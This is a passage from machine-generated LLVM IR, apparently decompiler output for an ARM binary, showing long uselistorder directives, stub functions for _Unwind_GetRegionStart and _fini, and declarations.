961, 960, 959, 958, 957, 186, 187, 189, 188, 183, 185, 184, 1253, 1254, 1255, 1256, 1257, 586, 587, 731, 1258, 1259, 732, 1260, 1261, 733, 1262, 1264, 1263, 966, 965, 964, 963, 235, 236, 239, 240, 241, 234, 238, 237, 1266, 1267, 1268, 734, 735, 968, 967, 168, 171, 172, 167, 170, 169, 1269, 1270, 1271, 736, 614, 613, 737, 1272, 612, 1273, 969, 190, 191, 195, 196, 197, 194, 193, 192, 1274, 1275, 1276, 738, 617, 616, 739, 1277, 615, 1278, 974, 973, 972, 971, 970, 174, 175, 180, 179, 181, 178, 176, 173, 177, 1281, 1282, 1283, 740, 1284, 741, 619, 618, 742, 1285, 975, 365, 368, 369, 370, 367, 363, 366, 364, 1286, 1287, 743, 1288, 620, 574, 744, 976, 244, 245, 1290, 1291, 745, 1292, 621, 575, 746, 977, 222, 223, 1299, 622, 747, 978, 146, 147, 148, 1303, 979, 210, 1308, 980, 319, 1345, 1348, 748, 1349, 1350, 1346, 1347, 1351, 1352, 517, 518, 520, 519, 516, 521, 1358, 749, 981, 18, 1359, 387, 982, 983, 515 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_196c0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_196c8 = add i32 %tmp1, 72
  %v2_196c8 = inttoptr i32 %v1_196c8 to i32*
  %v3_196c8 = load i32, i32* %v2_196c8, align 4
  ret i32 %v3_196c8

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 9, 8, 11, 10, 171, 172, 173, 174, 15, 16, 63, 17, 175, 55, 12, 176, 177, 178, 179, 180, 182, 183, 181, 184, 185, 186, 187, 188, 189, 190, 18, 19, 20, 21, 23, 22, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 64, 65, 87, 66, 67, 191, 6, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 3, 125, 126, 127, 128, 129, 27, 130, 148, 28, 29, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 167, 160, 161, 162, 163, 164, 165, 166, 168, 169, 30, 170, 4, 88, 89, 31, 90, 91, 92, 32, 68, 40, 50, 51, 52, 69, 70, 53, 41, 42, 43, 44, 45, 46, 47, 48, 49, 54, 71, 72, 73, 7, 74, 75, 76, 77, 79, 80, 39, 81, 33, 82, 34, 83, 35, 84, 86, 85, 78, 5, 122, 93, 94, 36, 95, 96, 97, 37, 98, 99, 100, 101, 102, 103, 13, 104, 105, 106, 107, 108, 109, 14, 110, 111, 38, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 123, 124, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_196dc = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_196dc)
  %v31_196e4 = load i32, i32* @r0, align 4
  ret i32 %v31_196e4

; uselistorder directives
  uselistorder i32* @r0, { 14, 15, 16, 241, 242, 243, 17, 43, 80, 91, 244, 247, 248, 71, 18, 245, 246, 223, 45, 8, 249, 9, 19, 81, 0, 82, 10, 11, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 1, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 83, 42, 72, 73, 74, 75, 76, 77, 78, 79, 84, 85, 86, 87, 88, 89, 90, 20, 239, 21, 240, 22, 23, 24, 25, 165, 166, 276, 277, 279, 59, 60, 61, 62, 26, 197, 198, 2, 27, 28, 96, 97, 3, 29, 30, 280, 281, 4, 31, 32, 206, 207, 5, 33, 34, 68, 69, 278, 150, 92, 225, 35, 56, 57, 226, 6, 227, 228, 229, 217, 54, 218, 219, 220, 55, 221, 222, 36, 237, 230, 231, 232, 233, 234, 235, 236, 98, 99, 37, 208, 38, 209, 213, 39, 214, 193, 40, 194, 100, 41, 101, 215, 48, 216, 102, 49, 50, 167, 168, 169, 170, 103, 44, 104, 46, 47, 171, 172, 173, 174, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 65, 135, 63, 64, 66, 67, 136, 139, 140, 141, 142, 143, 144, 137, 138, 93, 94, 95, 52, 13, 145, 146, 147, 148, 149, 70, 151, 152, 53, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 175, 176, 177, 178, 179, 180, 181, 12, 182, 183, 184, 185, 186, 187, 188, 210, 211, 7, 189, 190, 191, 192, 195, 196, 199, 200, 201, 202, 203, 204, 205, 212, 224, 238, 58, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 67, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 27, 28, 72, 77, 78, 79, 80, 81, 82, 83, 73, 87, 88, 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 38, 74, 75, 76, 84, 85, 86, 39, 40, 41, 35, 36, 37, 42, 46, 47, 43, 44, 45, 91, 29, 30, 31, 32, 33, 34, 58, 59 }
  uselistorder i32 0, { 423, 422, 486, 487, 1386, 427, 426, 488, 1387, 1388, 1389, 1390, 372, 371, 489, 1391, 1392, 207, 1393, 1395, 1396, 153, 154, 1397, 1398, 1394, 97, 98, 99, 100, 2, 1, 3, 0, 196, 195, 197, 198, 199, 1399, 424, 425, 147, 142, 1400, 1401, 201, 202, 200, 203, 1402, 1403, 1404, 1405, 206, 205, 204, 1406, 1407, 1408, 413, 412, 490, 428, 491, 429, 492, 430, 493, 494, 495, 155, 1409, 444, 443, 1410, 1411, 442, 441, 1412, 496, 439, 440, 437, 438, 436, 435, 1413, 434, 433, 432, 431, 381, 1414, 1430, 1415, 210, 1416, 1417, 1418, 1419, 1420, 1421, 212, 1423, 1424, 208, 209, 1425, 1426, 131, 156, 1427, 1428, 683, 101, 102, 414, 415, 211, 1422, 1429, 380, 1431, 497, 498, 1432, 446, 445, 213, 1433, 1434, 214, 1435, 1436, 1437, 113, 499, 500, 1438, 215, 1439, 157, 1440, 1441, 216, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 39, 132, 501, 1452, 217, 1453, 1454, 1455, 4, 1456, 1457, 5, 1458, 1459, 897, 898, 6, 148, 1460, 502, 1461, 811, 812, 813, 814, 815, 819, 816, 817, 818, 7, 382, 103, 820, 503, 821, 822, 823, 447, 448, 899, 900, 8, 504, 756, 505, 1462, 1463, 1464, 9, 10, 158, 159, 160, 1479, 1480, 11, 757, 161, 162, 1296, 1297, 1298, 1299, 218, 219, 1300, 766, 220, 133, 49, 1481, 104, 383, 1485, 1486, 50, 824, 114, 825, 826, 827, 384, 163, 1482, 1483, 1484, 385, 12, 1487, 1488, 1489, 1490, 1491, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1492, 1493, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 40, 1512, 1513, 1514, 1515, 1516, 41, 1517, 1518, 1519, 42, 1520, 1521, 1522, 43, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1547, 1548, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 44, 1566, 1567, 1568, 1569, 1570, 45, 1571, 1572, 1573, 1574, 1575, 46, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 221, 828, 684, 829, 830, 831, 832, 866, 506, 507, 867, 868, 164, 165, 166, 225, 833, 223, 834, 855, 848, 685, 849, 850, 851, 852, 51, 52, 117, 853, 854, 386, 856, 857, 686, 858, 222, 859, 53, 54, 116, 860, 861, 687, 862, 863, 55, 56, 115, 864, 224, 865, 167, 835, 688, 836, 837, 508, 838, 839, 689, 840, 841, 844, 842, 843, 387, 845, 57, 58, 119, 846, 690, 59, 60, 118, 847, 869, 691, 870, 871, 872, 873, 874, 875, 692, 876, 877, 878, 879, 759, 758, 390, 761, 762, 760, 388, 389, 763, 764, 509, 765, 767, 768, 693, 769, 770, 771, 694, 772, 773, 61, 62, 120, 774, 775, 776, 105, 106, 777, 778, 779, 226, 780, 781, 782, 783, 784, 510, 785, 786, 787, 788, 789, 790, 168, 793, 695, 794, 795, 63, 64, 122, 796, 797, 798, 696, 799, 800, 801, 802, 697, 803, 804, 65, 66, 121, 805, 806, 807, 808, 809, 227, 229, 791, 228, 792, 230, 810, 169, 880, 885, 886, 881, 882, 883, 888, 889, 890, 231, 891, 892, 893, 894, 895, 884, 887, 896, 170, 901, 902, 903, 511, 1035, 512, 904, 1465, 1466, 1467, 232, 1468, 1361, 1360, 1304, 1277, 1143, 906, 905, 907, 1036, 1037, 1038, 1591, 1592, 1593, 1594, 233, 1595, 1596, 1597, 1305, 1306, 410, 411, 513, 1602, 701, 1603, 514, 1604, 1605, 515, 1606, 1607, 699, 234, 392, 1608, 700, 1609, 516, 107, 1610, 1611, 517, 1626, 1627, 1630, 698, 391, 1631, 449, 172, 171, 1628, 1629, 1598, 1599, 702, 235, 373, 746, 13, 14, 1622, 1167, 925, 1621, 1244, 1362, 143, 237, 1363, 703, 236, 1364, 1365, 1612, 1613, 1614, 1615, 518, 1616, 173, 999, 1000, 67, 68, 123, 1366, 1367, 112, 394, 1371, 1368, 1369, 704, 1370, 1372, 705, 1373, 1374, 1375, 1376, 69, 70, 124, 1377, 238, 1378, 1379, 1380, 1382, 1381, 393, 747, 749, 748, 239, 750, 751, 752, 519, 753, 174, 1600, 1601, 1001, 1002, 1003, 1004, 1005, 1006, 241, 175, 1007, 1008, 1009, 144, 240, 1010, 176, 521, 522, 1617, 520, 177, 178, 1312, 1313, 1314, 1315, 1316, 242, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 243, 1307, 523, 1308, 1309, 524, 1310, 1311, 179, 1278, 525, 244, 1279, 1280, 1281, 1282, 1283, 180, 251, 245, 246, 248, 247, 250, 254, 253, 252, 249, 1324, 1325, 1349, 1350, 181, 1326, 1327, 258, 256, 257, 1328, 1329, 264, 263, 191, 255, 1330, 1331, 1332, 1333, 1334, 1335, 417, 416, 450, 526, 1336, 1337, 1338, 108, 1339, 260, 259, 261, 262, 190, 1340, 1341, 395, 1342, 1343, 151, 1344, 1345, 1346, 1347, 1348, 15, 16, 926, 927, 109, 17, 451, 527, 1267, 1245, 1247, 1246, 1269, 1268, 1145, 1144, 929, 928, 1011, 930, 931, 1271, 1270, 1272, 1301, 1632, 1633, 125, 182, 1039, 1040, 1041, 265, 908, 909, 266, 1042, 1047, 1048, 1049, 1050, 267, 1043, 268, 1044, 1045, 183, 1051, 1012, 528, 1146, 1618, 1619, 1620, 932, 934, 933, 1052, 935, 1383, 936, 937, 938, 1623, 1624, 1625, 1046, 18, 1469, 1470, 1471, 149, 1472, 1473, 1474, 1475, 1476, 269, 1477, 706, 709, 707, 708, 1478, 710, 192, 270, 1053, 1054, 145, 405, 1055, 1056, 711, 19, 396, 271, 272, 273, 71, 274, 529, 939, 1057, 1058, 1059, 1286, 1285, 1287, 1288, 1289, 1290, 47, 275, 1291, 1292, 1293, 276, 134, 135, 484, 485, 910, 278, 277, 279, 1060, 280, 1061, 1062, 281, 1351, 1352, 530, 282, 1063, 283, 284, 1198, 285, 1168, 947, 940, 288, 941, 942, 531, 943, 532, 738, 726, 727, 716, 728, 717, 729, 730, 718, 731, 719, 732, 720, 733, 721, 734, 735, 136, 72, 376, 377, 736, 722, 737, 739, 740, 741, 742, 743, 286, 287, 744, 745, 944, 712, 945, 533, 946, 398, 397, 948, 949, 950, 951, 290, 289, 952, 953, 954, 723, 374, 955, 126, 127, 375, 956, 128, 129, 534, 958, 959, 713, 960, 961, 962, 963, 964, 535, 965, 966, 967, 406, 193, 715, 968, 969, 970, 971, 972, 973, 714, 974, 975, 536, 976, 537, 977, 980, 981, 982, 291, 978, 292, 979, 293, 957, 911, 912, 913, 138, 73, 914, 137, 74, 915, 916, 538, 917, 539, 918, 540, 919, 920, 922, 294, 295, 921, 407, 75, 130, 418, 923, 296, 20, 924, 1169, 1170, 983, 297, 984, 985, 986, 987, 988, 989, 990, 379, 378, 991, 541, 992, 542, 993, 543, 994, 419, 997, 544, 998, 754, 545, 995, 996, 546, 1013, 1014, 1015, 302, 301, 724, 184, 725, 300, 299, 298, 400, 408, 1016, 303, 1024, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 399, 547, 1025, 548, 1026, 549, 1027, 550, 1028, 551, 1029, 1030, 552, 1031, 1032, 1033, 76, 1034, 304, 553, 146, 1064, 1065, 1066, 1067, 403, 1068, 1069, 1070, 402, 1071, 1072, 1073, 1074, 305, 1075, 1077, 1076, 185, 186, 306, 401, 308, 307, 1078, 309, 310, 110, 311, 1079, 314, 1080, 1081, 1082, 1083, 313, 312, 315, 1084, 1085, 77, 78, 187, 1086, 1087, 21, 22, 23, 24, 1088, 1089, 316, 453, 1090, 554, 1091, 555, 1092, 556, 1093, 557, 1094, 558, 1095, 559, 1096, 452, 1097, 320, 1099, 1100, 1101, 1102, 318, 317, 321, 1103, 1104, 79, 80, 1098, 319, 1106, 1105, 25, 26, 27, 28, 1107, 322, 1108, 1109, 455, 1110, 560, 1111, 561, 1112, 562, 1113, 563, 1114, 564, 1115, 565, 1116, 454, 1117, 566, 1118, 326, 1120, 1121, 1122, 1123, 324, 323, 327, 1124, 1125, 81, 82, 1119, 325, 1126, 83, 567, 1127, 1129, 1130, 1131, 1132, 568, 1133, 29, 30, 31, 32, 33, 1128, 328, 1134, 1135, 461, 1136, 460, 1137, 459, 1138, 458, 1139, 456, 1140, 457, 1141, 569, 1142, 332, 1148, 1149, 1150, 1151, 330, 329, 333, 1152, 1153, 84, 85, 1147, 331, 1154, 86, 570, 1155, 1157, 1158, 1159, 1160, 571, 1161, 34, 35, 36, 37, 38, 1156, 334, 1162, 1163, 463, 1164, 462, 1165, 572, 1166, 337, 1171, 1172, 1173, 1174, 336, 335, 338, 1175, 1176, 87, 88, 194, 150, 339, 111, 574, 1177, 1178, 1179, 1180, 1181, 340, 1182, 1183, 466, 1184, 1185, 1186, 1187, 344, 341, 342, 343, 1188, 1189, 1190, 1191, 1192, 1193, 465, 1194, 573, 1195, 464, 1196, 575, 1197, 346, 1199, 1200, 1201, 1202, 345, 347, 1203, 1204, 89, 90, 139, 1205, 348, 1206, 1207, 469, 1208, 467, 1209, 468, 1210, 1213, 1214, 1215, 350, 351, 1216, 1217, 91, 1211, 1212, 349, 1219, 1218, 1220, 352, 1221, 1222, 472, 1223, 471, 1224, 470, 1225, 576, 1226, 1228, 1229, 1230, 354, 355, 356, 1232, 1233, 92, 1231, 1227, 353, 1235, 1236, 1234, 1237, 357, 1238, 1239, 475, 1240, 474, 1241, 473, 1242, 577, 1243, 361, 1249, 1250, 1251, 1252, 360, 359, 362, 1253, 1254, 93, 94, 1248, 358, 1255, 1256, 363, 1257, 1258, 478, 1259, 477, 1260, 476, 1261, 578, 1262, 580, 140, 95, 1263, 188, 479, 581, 582, 1264, 1265, 364, 365, 1266, 579, 584, 141, 96, 1273, 189, 480, 585, 1274, 1275, 366, 367, 1276, 583, 420, 1284, 1294, 368, 1295, 1302, 369, 1303, 1353, 152, 1354, 1355, 421, 586, 404, 1356, 1357, 48, 409, 1358, 1359, 587, 1384, 370, 1385, 1634, 481, 755, 482, 483, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649 }
  uselistorder i32* @r4, { 84, 833, 834, 835, 836, 837, 855, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 10, 852, 853, 854, 856, 857, 858, 859, 860, 861, 862, 863, 91, 92, 93, 94, 137, 11, 138, 139, 140, 12, 141, 142, 143, 144, 145, 146, 147, 0, 13, 148, 149, 150, 151, 152, 153, 154, 155, 214, 215, 864, 85, 86, 87, 866, 867, 868, 5, 871, 57, 865, 752, 753, 95, 96, 97, 98, 99, 100, 101, 102, 103, 872, 873, 156, 157, 14, 4, 158, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 15, 159, 160, 161, 162, 163, 164, 165, 166, 185, 16, 186, 187, 167, 168, 170, 17, 171, 174, 18, 175, 176, 19, 177, 178, 20, 179, 180, 21, 181, 182, 22, 183, 54, 184, 169, 188, 23, 189, 190, 191, 192, 193, 194, 195, 172, 173, 88, 89, 90, 104, 105, 106, 107, 24, 108, 25, 26, 109, 110, 111, 112, 113, 114, 115, 120, 121, 27, 122, 123, 28, 124, 125, 29, 126, 127, 30, 128, 129, 31, 130, 131, 32, 132, 133, 116, 117, 118, 119, 134, 135, 136, 196, 197, 198, 33, 199, 200, 201, 34, 202, 203, 204, 205, 206, 207, 52, 208, 209, 210, 211, 212, 213, 216, 217, 218, 219, 357, 220, 869, 870, 815, 816, 817, 818, 819, 820, 716, 717, 358, 359, 890, 891, 892, 757, 758, 56, 896, 53, 897, 898, 899, 915, 917, 918, 919, 916, 900, 905, 913, 914, 893, 906, 907, 908, 909, 58, 821, 822, 6, 35, 823, 36, 824, 825, 826, 901, 902, 827, 75, 76, 77, 78, 79, 80, 894, 895, 903, 904, 221, 222, 223, 224, 759, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 37, 775, 776, 777, 778, 760, 761, 762, 718, 719, 720, 721, 722, 723, 724, 725, 726, 38, 727, 728, 729, 730, 731, 732, 733, 734, 735, 779, 801, 802, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 55, 793, 794, 1, 795, 796, 797, 798, 799, 800, 244, 245, 246, 59, 651, 652, 653, 654, 655, 658, 659, 660, 656, 657, 690, 691, 692, 693, 694, 695, 696, 60, 504, 505, 506, 509, 510, 511, 507, 508, 247, 248, 249, 250, 251, 252, 253, 254, 255, 61, 697, 698, 699, 700, 701, 702, 703, 360, 361, 362, 363, 364, 365, 366, 225, 226, 227, 367, 368, 369, 370, 9, 371, 372, 373, 374, 375, 376, 377, 256, 257, 258, 261, 262, 263, 259, 260, 264, 265, 266, 267, 268, 269, 910, 911, 912, 270, 271, 272, 378, 379, 380, 381, 382, 273, 274, 275, 594, 595, 553, 554, 73, 74, 276, 277, 278, 279, 64, 65, 62, 63, 66, 67, 68, 69, 70, 71, 72, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 298, 299, 300, 301, 308, 309, 310, 311, 312, 7, 302, 303, 304, 305, 306, 307, 294, 295, 296, 297, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 704, 705, 555, 556, 557, 558, 559, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 332, 333, 334, 335, 336, 337, 81, 82, 326, 327, 328, 329, 330, 331, 39, 40, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 383, 384, 8, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 41, 401, 42, 402, 43, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 44, 427, 45, 428, 46, 429, 47, 430, 431, 432, 433, 48, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 49, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 50, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 661, 662, 51, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 2, 683, 684, 685, 686, 687, 688, 689, 706, 707, 708, 3, 709, 710, 711, 712, 713, 714, 715, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 754, 755, 756, 803, 804, 807, 805, 806, 808, 809, 810, 811, 812, 813, 814, 828, 829, 830, 831, 83, 832 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
